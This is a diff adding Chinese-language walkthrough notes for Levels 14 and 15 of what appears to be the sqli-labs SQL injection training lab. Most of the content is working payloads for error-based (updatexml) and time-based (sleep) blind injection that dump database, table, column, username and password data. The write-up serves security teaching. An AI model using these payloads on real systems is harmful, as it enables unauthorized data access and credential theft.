@@ -1755,3 +1755,209 @@ UPDATEXML (XML_document, XPath_string, new_value)
 ![Less-13_12](./img/Less-13_12.PNG)
 
 爆破出所有数据：`DumbDumb,AngelinaI-kill-you,Dum`
+
+
+
+### Level-14 POST盲注 回显报错
+
++ 首先进入第十四关，页面如下
+
+![Less-14_1](./img/Less-14_1.PNG)
+
+
+
++ 首先注入<code>1</code>，页面没有反应
+
+![Less-14_2](./img/Less-14_2.PNG)
+
+
+
++ 然后注入<code>1'</code>，页面也没有反应
+
+![Less-14_3](./img/Less-14_3.PNG)
+
+
+
++ 最后注入<code>1"</code>，页面出现报错回显
+
+![Less-14_4](./img/Less-14_4.PNG)
+
+
+
++ 然后注入<code>1" #</code>闭合
+
+![Less-14_5](./img/Less-14_5.PNG)
+
+
+
++ 注入语句看是否有<code>sql</code>语句
+
+~~~ shell
+1" or 1=1 # 
+~~~
+
+![Less-14_6](./img/Less-14_6.PNG)
+
+登录成功，可看出确实存在<code>sql</code>语句
+
+
+
++ 确认3个回显位
+
+~~~ shell
+1" order by 3#
+~~~
+
+![Less-14_7](./img/Less-14_7.PNG)
+
+
+
+确认是否有2个回显位
+
+~~~ shell
+1" order by 2#
+~~~
+
+![Less-14_8](./img/Less-14_8.PNG)
+
+由此可确定只有两个回显位
+
+
+
++ 确认数据库名
+
+~~~ shell
+1" union select 1,updatexml(1,concat(0x7e,database(),0x7e),1) #
+~~~
+
+![Less-14_9](./img/Less-14_9.PNG)
+
+
+
++ 爆破数据表名
+
+~~~ shell
+1" union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),0x7e),1)#
+~~~
+
+![Less-14_10](./img/Less-14_10.PNG)
+
+
+
++ 爆破数据字段名
+
+~~~ shell
+1" union select 1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),0x7e),1)#
+~~~
+
+![Less-14_11](./img/Less-14_11.PNG)
+
+
+
++ 爆破数据
+
+~~~ shell
+1" union select 1,updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)#
+~~~
+
+![Less-14_12](./img/Less-14_12.PNG)
+
+
+
+### Level-15 时间盲注
+
++ 首先打开第十五关如下
+
+![Less-15_1](./img/Less-15_1.PNG)
+
+
+
++ 注入<code>1</code>、<code>1'</code>、<code>1"</code>，发现页面如下
+
+![Less-15_2](./img/Less-15_2.PNG)
+
+
+
++ 注入如下语句
+
+~~~ shell
+1' or 1=1 #
+~~~
+
+![Less-15_3](./img/Less-15_3.PNG)
+
+返回了正确页面，由上边返回错误页面这里返回正确页面可尝试布尔盲注或时间盲注
+
+
+
++ 判断是否有延时
+
+~~~ shell
+admin' and sleep(5) #
+~~~
+
+由于<code>1</code>不行没有反应所以<code>admin</code>代替<code>1</code>，而且只能是<code>admin</code>其他字符没有反应
+
+![Less-15_4](./img/Less-15_4.PNG)
+
+页面有延时，则时间盲注可用
+
+
+
++ 爆数据库长度
+
+~~~ shell
+admin' and if(length(database())=8,sleep(5),null) #
+~~~
+
+![Less-15_5](./img/Less-15_5.PNG)
+
+由于页面产生了延时，所以数据库名长度是8
+
+
+
++ 爆库名，从左边第一个字母开始，判断库名第一个字母是不是`s`
+
+~~~ shell
+admin' and if(left(database(),1)='s',sleep(5),null) #
+
+admin' and if(left(database(),2)='se',sleep(5),null) #
+
+......
+~~~
+
+![Less-15_6](./img/Less-15_6.PNG)
+
+由于页面有延时，因此数据库名是"se..."。得到的最终结果是<code>security</code>
+
+
+
+或者注入如下语句也可，是同样的效果
+
+~~~ shell
+admin' and if(ascii(substr(database(),0,1))=115,1,sleep(5))#
+
+admin' and if((select (substr(database(),1,1))="s") ,sleep(5), null)#
+~~~
+
+
+
++ 爆表名
+
+~~~ shell
+admin' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' ,sleep(5),null)#
+
+admin' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)='em' ,sleep(5),null)#
+
+admin' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),3)='ema' ,sleep(5),null)#
+
+......
+~~~
+
+![Less-15_7](./img/Less-15_7.PNG)
+
+根据页面是否有延时逐个 判断数据表的字符是否正确
+
+
+
++ 一个个测太麻烦，这里就不测下去了，知道可以使用时间盲注就行
